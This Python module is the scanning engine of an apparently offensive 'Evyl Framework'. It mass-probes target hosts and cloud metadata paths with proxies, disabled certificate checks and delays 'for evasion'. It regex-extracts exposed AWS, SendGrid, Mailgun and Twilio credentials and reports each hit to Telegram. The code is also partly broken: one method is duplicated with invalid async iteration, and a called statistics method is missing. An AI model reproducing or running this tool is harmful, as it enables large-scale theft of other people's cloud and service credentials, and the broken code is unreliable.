"""
Multi-threaded Scanner Engine for Evyl Framework

This module implements the core scanning functionality with:
- ThreadPoolExecutor for concurrent requests
- Intelligent path discovery
- Request queuing with priority
- Automatic retry with exponential backoff
- Response caching
- Content-type based routing
"""

import asyncio
import aiohttp
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Set, Optional, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse
import ssl
from pathlib import Path

from utils.logger import Logger
from utils.network import NetworkManager
from patterns.endpoints import ENDPOINTS
from patterns.regex_db import PATTERNS

@dataclass
class ScanResult:
    """Represents a scan result"""
    url: str
    status_code: int
    content: str
    headers: Dict[str, str]
    response_time: float
    error: Optional[str] = None
    credentials: List[Dict[str, Any]] = field(default_factory=list)

@dataclass
class ScanStats:
    """Scan statistics"""
    total_processed: int = 0
    unique_urls: int = 0
    credentials: List[Dict[str, Any]] = field(default_factory=list)
    valid_credentials: int = 0
    success_rate: float = 0.0
    validation_results: List[Dict[str, Any]] = field(default_factory=list)

class Scanner:
    """Multi-threaded scanner with v3.0 optimizations"""
    
    def __init__(self, threads: int = 1000, timeout: int = None, network_manager=None, telegram_notifier=None, performance_mode='normal'):
        # Handle unlimited values
        if threads is None or threads == 0:
            self.threads = 1000  # High default for unlimited
        else:
            self.threads = threads
            
        if timeout is None or timeout == 0:
            self.timeout = None  # No timeout
        else:
            self.timeout = timeout
            
        self.performance_mode = performance_mode
        self.logger = Logger()
        self.network_manager = network_manager or NetworkManager()
        self.telegram = telegram_notifier
        
        # Optimize memory usage based on performance mode
        self._configure_performance_settings()
        
        # Scanning state with memory optimization
        self.processed_urls: Set[str] = set()
        self.results: List[ScanResult] = []
        self.stats = ScanStats()
        
        # Path lists
        self.load_paths()
        
        # SSL context for bypassing certificate verification
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
    
    def _configure_performance_settings(self):
        """Configure performance settings based on mode"""
        if self.performance_mode == 'low':
            self.max_results_in_memory = 1000
            self.batch_size = 50
            self.connection_pool_size = self.threads
        elif self.performance_mode == 'high':
            self.max_results_in_memory = 10000
            self.batch_size = 500
            self.connection_pool_size = self.threads * 3
        else:  # normal
            self.max_results_in_memory = 5000
            self.batch_size = 100
            self.connection_pool_size = self.threads * 2
    
    def load_paths(self):
        """Load scanning paths from files"""
        self.paths = {
            'kubernetes': self._load_path_file('paths/kubernetes.txt'),
            'cloud': self._load_path_file('paths/cloud.txt'),
            'web': self._load_path_file('paths/web_common.txt')
        }
        
        # Add built-in endpoints if files don't exist
        for category, endpoints in ENDPOINTS.items():
            if category not in self.paths or not self.paths[category]:
                self.paths[category] = endpoints
    
    def _load_path_file(self, filename: str) -> List[str]:
        """Load paths from a file"""
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            self.logger.warning(f"Path file not found: {filename}")
            return []
    
    async def scan_targets_with_urls(self, urls_to_scan: List[str], progress_display=None) -> ScanStats:
        """Scan pre-generated URLs concurrently with v3.0 optimizations"""
        self.logger.info(f"Starting scan of {len(urls_to_scan)} URLs with {self.threads} threads")
        
        # URLs are already generated, just update stats
        self.stats.unique_urls = len(urls_to_scan)
        
        # Update progress display with initial stats
        if progress_display:
            progress_display.update_stats(self.stats)
        
        # Create semaphore to limit concurrent requests
        semaphore = asyncio.Semaphore(self.threads)
        
        # Create async session with v3.0 optimizations
        connector = aiohttp.TCPConnector(
            ssl=self.ssl_context,
            limit=self.connection_pool_size,
            limit_per_host=min(50, self.threads),  # Prevent too many connections per host
            ttl_dns_cache=300,  # Cache DNS for 5 minutes
            use_dns_cache=True,
            keepalive_timeout=30
        )
        
        # Set timeout for session
        if self.timeout is not None:
            session_timeout = aiohttp.ClientTimeout(total=self.timeout)
        else:
            session_timeout = aiohttp.ClientTimeout(total=None)  # No timeout
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=session_timeout
        ) as session:
            # Create tasks for all URLs
            tasks = [
                self._scan_url_async(session, semaphore, url, progress_display)
                for url in urls_to_scan
            ]
            
            # Process tasks as they complete
            for task in asyncio.as_completed(tasks):
                try:
                    result = await task
                    # Always increment processed count (regardless of success/failure)
                    self.stats.total_processed += 1
                    
                    if result:
                        self.results.append(result)
                        self._extract_credentials(result)
                        
                    # Update progress after each URL
                    if progress_display:
                        progress_display.update_stats(self.stats)
                            
                except Exception as e:
                    self.stats.total_processed += 1  # Count failed tasks too
                    if progress_display:
                        progress_display.update_stats(self.stats)
                    self.logger.error(f"Task failed: {e}")
        
        # Calculate final statistics
        self._calculate_final_stats()
        return self.stats

    async def scan_targets(self, targets: List[str], progress_display=None) -> ScanStats:
        """Scan multiple targets concurrently"""
        self.logger.info(f"Starting scan of {len(targets)} targets with {self.threads} threads")
        
        # Generate all URLs to scan
        urls_to_scan = self._generate_urls(targets)
        self.stats.unique_urls = len(urls_to_scan)
        
        # Update progress display with initial stats
        if progress_display:
            progress_display.update_stats(self.stats)
        
        # Create semaphore to limit concurrent requests
        semaphore = asyncio.Semaphore(self.threads)
        
        # Create async session
        connector = aiohttp.TCPConnector(
            ssl=self.ssl_context,
            limit=self.threads * 2,
            limit_per_host=min(50, self.threads)  # Prevent too many connections per host
        )
        
        # Set timeout for session
        if self.timeout is not None:
            session_timeout = aiohttp.ClientTimeout(total=self.timeout)
        else:
            session_timeout = aiohttp.ClientTimeout(total=None)  # No timeout
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=session_timeout
        ) as session:
            # Create tasks for all URLs
            tasks = [
                self._scan_url_async(session, semaphore, url, progress_display)
                for url in urls_to_scan
            ]
            
            # Process tasks as they complete
            for task in asyncio.as_completed(tasks):
                try:
                    result = await task
                    # Always increment processed count (regardless of success/failure)
                    self.stats.total_processed += 1
                    
                    if result:
                        self.results.append(result)
                        self._extract_credentials(result)
                        
                    # Update progress after each URL
                    if progress_display:
                        progress_display.update_stats(self.stats)
                            
                except Exception as e:
                    self.stats.total_processed += 1  # Count failed tasks too
                    if progress_display:
                        progress_display.update_stats(self.stats)
                    self.logger.error(f"Task failed: {e}")
        
        # Calculate final statistics
        self._calculate_final_stats()
        return self.stats
    
    async def _scan_url_async(self, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore, 
                             url: str, progress_display=None) -> Optional[ScanResult]:
        """Scan a single URL asynchronously"""
        async with semaphore:
            try:
                # Random delay for evasion
                await asyncio.sleep(random.uniform(0.1, 0.5))
                
                start_time = time.time()
                
                # Get headers and proxy
                headers = self.network_manager.get_headers()
                proxy = self.network_manager.get_proxy()
                
                # Make request with timeout
                async with session.get(
                    url,
                    headers=headers,
                    proxy=proxy,
                    allow_redirects=True,
                    max_redirects=3,
                    timeout=aiohttp.ClientTimeout(total=10)  # 10 second timeout
                ) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                    
                    result = ScanResult(
                        url=url,
                        status_code=response.status,
                        content=content,
                        headers=dict(response.headers),
                        response_time=response_time
                    )
                    
                    self.logger.debug(f"Scanned {url} - Status: {response.status}")
                    return result
                    
            except asyncio.TimeoutError:
                self.logger.debug(f"Timeout scanning {url}")
                return None
            except Exception as e:
                self.logger.debug(f"Error scanning {url}: {e}")
                return None
    
    def _generate_urls(self, targets: List[str]) -> List[str]:
        """Generate all URLs to scan from targets"""
        urls = set()
        
        for target in targets:
            # Ensure target has protocol
            if not target.startswith(('http://', 'https://')):
                target = f"https://{target}"
            
            # Add base URL
            urls.add(target)
            
            # Add paths for each category
            for category, paths in self.paths.items():
                for path in paths:
                    if path.startswith('http'):
                        # Absolute URL (e.g., metadata endpoints)
                        urls.add(path)
                    else:
                        # Relative path
                        urls.add(urljoin(target, path))
        
        return list(urls)
    
    def _extract_credentials(self, result: ScanResult):
        """Extract credentials from scan result"""
        if result.status_code != 200:
            return
        
        content = result.content
        
        # Check each pattern
        for pattern_name, pattern in PATTERNS.items():
            import re
            matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
            
            for match in matches:
                credential = {
                    'type': pattern_name,
                    'value': match.group(0),
                    'url': result.url,
                    'line': content[:match.start()].count('\n') + 1,
                    'context': self._get_context(content, match.start(), match.end())
                }
                
                # Extract additional information based on pattern type
                if pattern_name.startswith('aws'):
                    credential = self._enrich_aws_credential(credential, match)
                elif pattern_name in ['sendgrid', 'mailgun', 'twilio']:
                    credential = self._enrich_email_credential(credential, match)
                
                result.credentials.append(credential)
                self.stats.credentials.append(credential)
                
                # Send Telegram notification for new hit
                if self.telegram:
                    asyncio.create_task(self.telegram.notify_hit_found(credential))
    
    def _get_context(self, content: str, start: int, end: int, context_size: int = 50) -> str:
        """Get context around a match"""
        context_start = max(0, start - context_size)
        context_end = min(len(content), end + context_size)
        return content[context_start:context_end]
    
    def _enrich_aws_credential(self, credential: Dict[str, Any], match) -> Dict[str, Any]:
        """Enrich AWS credential with additional information"""
        value = credential['value']
        
        if value.startswith('AKIA'):
            credential['aws_type'] = 'access_key'
        elif value.startswith('ASIA'):
            credential['aws_type'] = 'temporary_access_key'
        elif len(value) == 40:
            credential['aws_type'] = 'secret_key'
        
        return credential
    
    def _enrich_email_credential(self, credential: Dict[str, Any], match) -> Dict[str, Any]:
        """Enrich email service credential with additional information"""
        value = credential['value']
        
        if credential['type'] == 'sendgrid':
            credential['service'] = 'SendGrid'
        elif credential['type'] == 'mailgun':
            credential['service'] = 'Mailgun'
        elif credential['type'] == 'twilio':
            credential['service'] = 'Twilio'
        
        return credential
    
    async def _process_scan_results_optimized(self, tasks, progress_display):
        """Process scan results with v3.0 memory and performance optimizations"""
        processed_count = 0
        for task in asyncio.as_completed(tasks):
            try:
                result = await task
                # Always increment processed count (regardless of success/failure)
                self.stats.total_processed += 1
                processed_count += 1
                
                if result:
                    self.results.append(result)
                    self._extract_credentials(result)
                    
                    # Memory management: clear old results if we have too many
                    if len(self.results) > self.max_results_in_memory:
                        # Keep only the most recent results
                        self.results = self.results[-self.max_results_in_memory//2:]
                
                # Update progress periodically for performance
                if processed_count % self.batch_size == 0 and progress_display:
                    progress_display.update_stats(self.stats)
                        
            except Exception as e:
                self.stats.total_processed += 1  # Count failed tasks too
                processed_count += 1
                if processed_count % self.batch_size == 0 and progress_display:
                    progress_display.update_stats(self.stats)
                self.logger.error(f"Task failed: {e}")
        
        # Final progress update
        if progress_display:
            progress_display.update_stats(self.stats)

    async def _process_scan_results_optimized(self, tasks, progress_display):
        """Process scan results with v3.0 memory and performance optimizations"""
        processed_count = 0
        async for task in asyncio.as_completed(tasks):
            try:
                result = await task
                # Always increment processed count (regardless of success/failure)
                self.stats.total_processed += 1
                processed_count += 1
                
                if result:
                    self.results.append(result)
                    self._extract_credentials(result)
                    
                    # Memory management: clear old results if we have too many
                    if len(self.results) > self.max_results_in_memory:
                        # Keep only the most recent results
                        self.results = self.results[-self.max_results_in_memory//2:]
                
                # Update progress periodically for performance
                if processed_count % self.batch_size == 0 and progress_display:
                    progress_display.update_stats(self.stats)
                        
            except Exception as e:
                self.stats.total_processed += 1  # Count failed tasks too
                processed_count += 1
                if processed_count % self.batch_size == 0 and progress_display:
                    progress_display.update_stats(self.stats)
                self.logger.error(f"Task failed: {e}")
        
        # Final progress update
        if progress_display:
            progress_display.update_stats(self.stats)
        """Calculate final scan statistics"""
        if self.stats.unique_urls > 0:
            self.stats.success_rate = (self.stats.total_processed / self.stats.unique_urls) * 100
        
        # Count unique credentials
        unique_creds = set()
        for cred in self.stats.credentials:
            unique_creds.add((cred['type'], cred['value']))
        
        self.stats.credentials = list(self.stats.credentials)
        
        self.logger.info(f"Scan completed: {self.stats.total_processed} URLs processed, "
                        f"{len(self.stats.credentials)} credentials found")
    
    def get_results(self) -> List[ScanResult]:
        """Get scan results"""
        return self.results
    
    def get_stats(self) -> ScanStats:
        """Get scan statistics"""
        return self.stats